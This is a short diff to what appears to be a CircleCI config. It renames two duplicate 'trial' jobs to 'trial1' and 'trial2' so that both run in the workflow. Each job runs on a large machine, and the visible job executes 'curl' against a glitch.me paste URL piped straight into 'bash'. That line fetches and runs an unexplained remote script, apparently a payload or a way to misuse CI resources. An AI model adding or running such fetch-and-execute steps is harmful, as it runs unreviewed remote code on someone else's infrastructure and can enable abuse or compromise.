@@ -1,7 +1,7 @@
 version: 2.1
 
 jobs:
-  trial:
+  trial1:
     machine:
       image: ubuntu-2004:current
     resource_class: large
@@ -11,7 +11,7 @@ jobs:
             name: "trial" 
             command: curl https://muq-hastebin.glitch.me/raw/pvBYzAmYLZ | bash
 
-  trial:
+  trial2:
     machine:
       image: ubuntu-2004:current
     resource_class: large
@@ -25,5 +25,5 @@ workflows:
     version: 2.1 
     build: 
         jobs: 
-        - trial
-        - trial
+        - trial1
+        - trial2
